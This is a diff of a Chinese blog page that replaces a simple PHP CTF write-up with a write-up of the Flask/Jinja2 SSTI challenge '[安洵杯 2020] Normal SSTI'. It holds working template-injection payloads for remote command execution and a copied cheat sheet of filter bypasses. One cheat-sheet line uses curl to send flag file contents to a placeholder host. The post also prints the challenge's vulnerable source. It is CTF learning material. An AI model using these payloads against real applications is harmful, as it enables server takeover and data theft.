@@ -8,13 +8,11 @@
       
       
       
-        <link rel="canonical" href="http://www.sxrhhh.top/writeups/2024/05/27/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98--swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bjicao/">
+        <link rel="canonical" href="http://www.sxrhhh.top/writeups/2024/06/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98--%E5%AE%89%E6%B4%B5%E6%9D%AF-2020normal-ssti/">
       
       
-        <link rel="prev" href="../../26/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98--swpuctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9Bez_ez_php/">
+        <link rel="prev" href="../../../05/29/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98--moectf-2022ezhtml/">
       
-      
-        <link rel="next" href="../%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98--nustctf-2022-%E6%96%B0%E7%94%9F%E8%B5%9Bezprotocol/">
       
       
         <link rel="alternate" type="application/rss+xml" title="RSS 订阅" href="../../../../../feed_rss_created.xml">
@@ -25,7 +23,7 @@
     
     
       
-        <title>每日一题 —— [SWPUCTF 2021 新生赛]jicao - Sxrhhh 的个人小站</title>
+        <title>每日一题 —— [安洵杯 2020]Normal SSTI - Sxrhhh 的个人小站</title>
       
     
     
@@ -81,7 +79,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#每日一题--swpuctf-2021-新生赛jicao" class="md-skip">
+        <a href="#每日一题--安洵杯-2020normal-ssti" class="md-skip">
           跳转至
         </a>
       
@@ -117,7 +115,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              每日一题 —— [SWPUCTF 2021 新生赛]jicao
+              每日一题 —— [安洵杯 2020]Normal SSTI
             
           </span>
         </div>
@@ -1576,6 +1574,32 @@
     
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#ssti-前传" class="md-nav__link">
+    <span class="md-ellipsis">
+      SSTI 前传
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#题目分析" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目分析
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -1611,7 +1635,7 @@
                     <li class="md-nav__item">
                       <div class="md-nav__link">
                         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5v-5Z"/></svg>
-                        <time datetime="2024-05-27 00:00:00" class="md-ellipsis">2024年5月27日</time>
+                        <time datetime="2024-06-01 00:00:00" class="md-ellipsis">2024年6月1日</time>
                       </div>
                     </li>
                     
@@ -1622,7 +1646,7 @@
                           <span class="md-ellipsis">
                             分类于
                             
-                              <a href="../../../../category/swpuctf/">SWPUCTF</a></span>
+                              <a href="../../../../category/%E5%AE%89%E6%B4%B5%E6%9D%AF/">安洵杯</a></span>
                         </div>
                       </li>
                     
@@ -1633,7 +1657,7 @@
                           <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7h1.5Z"/></svg>
                           <span class="md-ellipsis">
                             
-                              需要 1 分钟阅读时间
+                              需要 4 分钟阅读时间
                             
                           </span>
                         </div>
@@ -1653,22 +1677,121 @@
         
 
 
-<h1 id="每日一题--swpuctf-2021-新生赛jicao">每日一题 —— [SWPUCTF 2021 新生赛]jicao<a class="headerlink" href="#每日一题--swpuctf-2021-新生赛jicao" title="永久链接">&para;</a></h1>
+<h1 id="每日一题--安洵杯-2020normal-ssti">每日一题 —— [安洵杯 2020]Normal SSTI<a class="headerlink" href="#每日一题--安洵杯-2020normal-ssti" title="永久链接">&para;</a></h1>
 <blockquote>
-<p>题目地址： <a href="https://www.nssctf.cn/problem/384">https://www.nssctf.cn/problem/384</a></p>
+<p>题目地址： <a href="https://www.nssctf.cn/problem/910">https://www.nssctf.cn/problem/910</a></p>
 </blockquote>
 <!-- more -->
-<p>进去给出了代码，可以看到要求传入两个参数：get 一个 <code>json</code> ; post 一个 <code>id</code>.</p>
-<p>打开 HackBar， 直接 post 一个 <code>id=wllbNB</code>, 然后根据代码，我们对 <code>json</code> 参数需要有以下要求：</p>
-<ol>
-<li>是一个合法的 json 字符串</li>
-<li>该 json 对象内有 <code>"x": "wllm"</code> 这个键值对</li>
-</ol>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>?json={&quot;x&quot;:&quot;wllm&quot;}
+
+<h2 id="ssti-前传">SSTI 前传<a class="headerlink" href="#ssti-前传" title="永久链接">&para;</a></h2>
+<p>在此之前，我只在 MiniL2024 的比赛中，接触过简单无过滤的、golang 的 SSTI。但是现在是比较正式的 flask+jinja2 的 SSTI。因此这篇 wp, 比起作为题解，更像是作为 SSTI 学习笔记。</p>
+<h2 id="题目分析">题目分析<a class="headerlink" href="#题目分析" title="永久链接">&para;</a></h2>
+<p>根据题目提示，我们需要访问 <code>/test/?url=xxx</code>，其中 <code>xxx</code> 是一个参数，会回显在屏幕上。我们根据提示，知道了这道题是 flask 的 SSTI(偷看 tag 标签)。 我们测试一下 <code>{{1+2}}</code>, 发现被过滤了。我们尝试使用 <code>{%print(1)%}</code>, 发现这个 <code>{%print(1)%}</code> 并没有被过滤。</p>
+<p>接下来我们要进行注入了。在此之前，我需要新学习一下 SSTI 的基本方法。首先我先创建了一个基本的 flask 程序。然后让 url 直接回显在屏幕上面。现在我使用这种以下的 url 访问， 可以直接实现 RCE:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>http://localhost:5000/?name={{&quot;&quot;.__class__.__bases__[0].__subclasses__()[154].__init__.__globals__[&#39;popen&#39;](&#39;cat$IFS/flag&#39;).read()}}
 </span></code></pre></div>
-<p>两个一起提交，最终得到 flag. 非常非常简单的一道题。</p>
+<p>接下来分析一下，name 参数里的意义</p>
+<ul>
+<li>"": 这个是一个字符串，它的基类是 object, 我们通过 <code>"".__class__.__bases__[0]</code> 获取到了 object。</li>
+<li><code>__subclasses__()[154]</code> : 这个就是 object 的子类，我们通过 <code>__subclasses__()</code> 获取到了所有的子类。然后我们通过网页的回显可以看到一大坨子类，我们找到了一个叫 <code>os._wrap_close</code> 的子类。这个模块可以用来执行命令。我们把所有的子类都复制到编辑器里面，把所有的除了逗号以外的都删掉，然后数一下逗号的个数，发现这个模块在第 154 个。我们利用 <code>__subclasses__()[154]</code> 获取到了这个模块。</li>
+<li><code>__init__.__globals__['popen']</code> : 获取到了 <code>os._wrap_close</code> 的属性。
+它的下面有一个 <code>popen</code> 方法，这个方法可以执行命令。</li>
+<li><code>'cat$IFS/flag'</code> : 执行命令。在这里空格是不能出现的，因为会被 urlencode 为 <code>%20</code>，因此我们需要使用 <code>$IFS</code> 来代替空格。但是其实这不是最好的方法，还有一个绕过方法，就是将引号内所有内容进行 unicode encode （注意和 urlencode 区分开来）.</li>
+</ul>
+<p>来自 <a href="https://blog.csdn.net/weixin_45669205/article/details/114373785">CSDN博客</a> 抄来的笔记。之后可能会专门出一节 blog 用来做 SSTI 学习。</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>__class__            类的一个内置属性，表示实例对象的类。
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>__base__             类型对象的直接基类
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>__bases__            类型对象的全部基类（除object），以元组形式，类型的实例通常没有属性。 __bases__
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>__subclasses__()     返回这个类的所有子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>__init__             初始化类，返回的类型是function
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#39;b&#39;]，就是a.__getitem__(&#39;b&#39;)
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()]
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>url_for              flask的一个方法，可以调用当前脚本中的函数，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app。
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app。
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()}}
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>current_app          应用上下文，一个全局变量。
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/proc\self\fd/3&#39;).read()
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>request.args.x1      get传参
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>request.values.x1    所有参数
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>request.cookies      cookies参数
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>request.headers      请求头参数
+</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a>request.form.x1      post传参 (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
+</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a>request.data         post传参 (Content-Type:a/b)
+</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a>request.json         post传json  (Content-Type: application/json)
+</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a>
+</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a>config               当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read() }}
+</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a>self.__dict__        保存当前类实例或对象实例的属性变量键值对字典，
+</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a>{%print(&quot;DMIND&quot;)%}   控制语句中也能输出
+</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a>
+</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a>拼接字符：{% set ind=dict(ind=a,ex=a)|join%}     变量ind=index
+</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a>获取字符：{{lipsum|string|list|attr(&#39;pop&#39;)(18)}} 相当于：lipsum|string|list|attr(&#39;pop&#39;)(18)  输出：_（下划线）
+</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a>得到数字：{{lipsum|string|list|attr(&#39;index&#39;)(&#39;g&#39;)}} 相当于lipsum|string|list|attr(&#39;index&#39;)(&#39;g&#39;) 输出：10
+</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a>运算出其他数字：{% set shiba=ten%2bten-two %}        %2b是URL编码后的加号
+</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a>
+</span><span id="__span-1-37"><a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a>得到数字：{{dict(a=a)|lower|list|count}}得到16
+</span><span id="__span-1-38"><a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a>运算出其他数字：{{dict(aa=a)|lower|list|count-dict(a=a)|lower|list|count}}得到1
+</span><span id="__span-1-39"><a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a>
+</span><span id="__span-1-40"><a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a>得到任意字符：{{dict(dmind=a)|slice(1)|first|first}}得到dmind
+</span><span id="__span-1-41"><a id="__codelineno-1-41" name="__codelineno-1-41" href="#__codelineno-1-41"></a>
+</span><span id="__span-1-42"><a id="__codelineno-1-42" name="__codelineno-1-42" href="#__codelineno-1-42"></a>获取__builtins__属性：{{lipsum.__globals__|attr(&#39;get&#39;)(&#39;__builtins__&#39;)}}     利用get()、pop()获取属性，相当于lipsum.__globals__.get(&#39;__builtins__&#39;)
+</span><span id="__span-1-43"><a id="__codelineno-1-43" name="__codelineno-1-43" href="#__codelineno-1-43"></a>
+</span><span id="__span-1-44"><a id="__codelineno-1-44" name="__codelineno-1-44" href="#__codelineno-1-44"></a>lipsum.__globals__.__builtins__  相当于  lipsum|attr(&#39;__globals__&#39;)|attr(&#39;get&#39;)(&#39;__builtins__&#39;)
+</span><span id="__span-1-45"><a id="__codelineno-1-45" name="__codelineno-1-45" href="#__codelineno-1-45"></a>lipsum.__globals__.__builtins__.chr(95)  相当于  lipsum|attr(&#39;__globals__&#39;)|attr(&#39;get&#39;)(&#39;__builtins__&#39;)|attr(&#39;get&#39;)(&#39;chr&#39;)(95)
+</span><span id="__span-1-46"><a id="__codelineno-1-46" name="__codelineno-1-46" href="#__codelineno-1-46"></a>
+</span><span id="__span-1-47"><a id="__codelineno-1-47" name="__codelineno-1-47" href="#__codelineno-1-47"></a>得到chr函数：{%set chr=lipsum.__globals__.__builtins__.chr%}
+</span><span id="__span-1-48"><a id="__codelineno-1-48" name="__codelineno-1-48" href="#__codelineno-1-48"></a>利用chr()得到字符：{{chr(47)~chr(32)}}  47是/  32是空格  ~是连接符
+</span><span id="__span-1-49"><a id="__codelineno-1-49" name="__codelineno-1-49" href="#__codelineno-1-49"></a>
+</span><span id="__span-1-50"><a id="__codelineno-1-50" name="__codelineno-1-50" href="#__codelineno-1-50"></a>利用os执行命令：lipsum.__globals__.os.popen(&#39;dir&#39;).read()  相当于  lipsum|attr(&#39;__globals__&#39;)|attr(&#39;get&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;dir&#39;)|attr(&#39;read&#39;)()
+</span><span id="__span-1-51"><a id="__codelineno-1-51" name="__codelineno-1-51" href="#__codelineno-1-51"></a>类似的       url_for[&#39;__globals__&#39;][&#39;os&#39;][&#39;popen&#39;](&#39;dir&#39;).read()
+</span><span id="__span-1-52"><a id="__codelineno-1-52" name="__codelineno-1-52" href="#__codelineno-1-52"></a>
+</span><span id="__span-1-53"><a id="__codelineno-1-53" name="__codelineno-1-53" href="#__codelineno-1-53"></a>简单的读取文件：url_for[&quot;__globa&quot;+&quot;ls__&quot;].__builtins__.open(&quot;flag.txt&quot;).read()
+</span><span id="__span-1-54"><a id="__codelineno-1-54" name="__codelineno-1-54" href="#__codelineno-1-54"></a>
+</span><span id="__span-1-55"><a id="__codelineno-1-55" name="__codelineno-1-55" href="#__codelineno-1-55"></a>在能执行eval情况下：eval(__import__(&#39;so&#39;[::-1]).__getattribute__(&#39;syste&#39;%2b&#39;m&#39;)(&#39;curl http://xxx:4567?p=`cat /f*`&#39;))
+</span></code></pre></div>
+<p>通篇看下来，对于这道题而言，因为使用的是 flask+jinja2, 所以还有一个更简单的 payload：
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>lipsum.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()
+</span></code></pre></div>
+这个的原理是什么呢，我们看一下 flask 内的方法，有一个 lipsum 类，它里面有 os 模块。我们通过 <code>lipsum.__globals__['os']</code> 获取到了 os 模块，然后我们就可以使用 os 模块的 popen 方法来执行命令。</p>
+<p>重新回到这道题，我们根据各种尝试，发现过滤了<code>空格</code>, <code>{{</code>, <code>[]</code>, <code>.</code>, 所以我们不能简单地使用这个方法。我们需要使用 <code>attr</code> 方法绕过。对于 <code>lipsum|attr('__globals__')</code>, 其实等效于 <code>lipsum.__globals__</code>，因此可以知道，attr 就是用来获取属性的。因此，我们的 payload 可以改写成 <code>lipsum|attr('__globals__')|attr('get')('os')|attr('popen')('ls').read()</code>。</p>
+<p>最后一步，我们发现有一部分字符串被过滤了，我们就可以把引号里面的内容进行 unicode encode，最后完成命令执行.</p>
+<p>最终 payload 如下：
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>?url={%print(lipsum|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067&quot;)|attr(&quot;read&quot;)())%}
+</span></code></pre></div>
+其中，命令执行的部分解码为： <code>cat /flag</code>。可以通过多次 RCE 得出最终 payload.</p>
 <hr />
-<p>拓展：php 中存在一个叫做 <code>json_decode</code> 的函数，这个函数的作用就是解析 json 字符串。通常来讲这个函数有两个参数，即： <code>json_decode(string, bool)</code> 。第一个参数 string 类型，表示被解析的 json 字符串。而第二个参数表示解析成的 php 对象。 true 即转换成数组，而 false 就转换成普通的 php 对象。</p>
+<p>ps: 经过命令执行，我读取了他的源代码，经过一番整理如下：</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="o">*</span> 
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span> 
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">url_black_list</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;</span><span class="si">%1c</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">%1d</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">%1f</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">%1e</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;%20&#39;</span><span class="p">,</span> <span class="s1">&#39;%2b&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">%2c</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">%3c</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">%3e</span><span class="s1">&#39;</span><span class="p">]</span> 
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="n">black_list</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;[&#39;</span><span class="p">,</span> <span class="s1">&#39;]&#39;</span><span class="p">,</span> <span class="s1">&#39;{{&#39;</span><span class="p">,</span> <span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="s1">&#39;_&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;&quot;&quot;&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">x&#39;</span><span class="p">,</span> <span class="s1">&#39;request&#39;</span><span class="p">,</span> <span class="s1">&#39;config&#39;</span><span class="p">,</span> <span class="s1">&#39;session&#39;</span><span class="p">,</span> <span class="s1">&#39;url_for&#39;</span><span class="p">,</span> <span class="s1">&#39;g&#39;</span><span class="p">,</span> <span class="s1">&#39;get_flashed_messages&#39;</span><span class="p">,</span> <span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="s1">&#39;for&#39;</span><span class="p">,</span> <span class="s1">&#39;if&#39;</span><span class="p">,</span> <span class="s1">&#39;format&#39;</span><span class="p">,</span> <span class="s1">&#39;list&#39;</span><span class="p">,</span> <span class="s1">&#39;lower&#39;</span><span class="p">,</span> <span class="s1">&#39;slice&#39;</span><span class="p">,</span> <span class="s1">&#39;striptags&#39;</span><span class="p">,</span> <span class="s1">&#39;trim&#39;</span><span class="p">,</span> <span class="s1">&#39;xmlattr&#39;</span><span class="p">,</span> <span class="s1">&#39;tojson&#39;</span><span class="p">,</span> <span class="s1">&#39;set&#39;</span><span class="p">,</span> <span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="s1">&#39;chr&#39;</span><span class="p">]</span> 
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span> 
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>    <span class="k">return</span> <span class="s1">&#39;try to check /test?url=xxx&#39;</span> 
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/test&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span> 
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="k">def</span> <span class="nf">testing</span><span class="p">():</span> 
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">url</span> 
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>    <span class="k">for</span> <span class="n">black</span> <span class="ow">in</span> <span class="n">url_black_list</span><span class="p">:</span>
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>        <span class="k">if</span> <span class="n">black</span> <span class="ow">in</span> <span class="n">url</span><span class="p">:</span>
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>            <span class="k">return</span> <span class="s1">&#39;&lt;h1&gt;do a real p1g&lt;/h1&gt;&#39;</span> 
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">)</span> 
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>    <span class="k">for</span> <span class="n">black</span> <span class="ow">in</span> <span class="n">black_list</span><span class="p">:</span>
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>        <span class="k">if</span> <span class="n">black</span> <span class="ow">in</span> <span class="n">url</span><span class="p">:</span> 
+</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>            <span class="k">return</span> <span class="s1">&#39;&lt;h1&gt;do a real p1g&lt;/h1&gt;&#39;</span> 
+</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="s1">&#39;&lt;h1&gt;this is your url </span><span class="si">{}</span><span class="s1">&lt;/h1&gt;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">url</span><span class="p">))</span> 
+</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>
+</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span> 
+</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8899</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></code></pre></div>
+<hr />
+<p>声明：本题解首次采用 vscode+comate 编写，即百度文心 AI 辅助生成。确实不错，写这篇 markdown 文件都能猜到我想要干什么。</p>
 
 
 
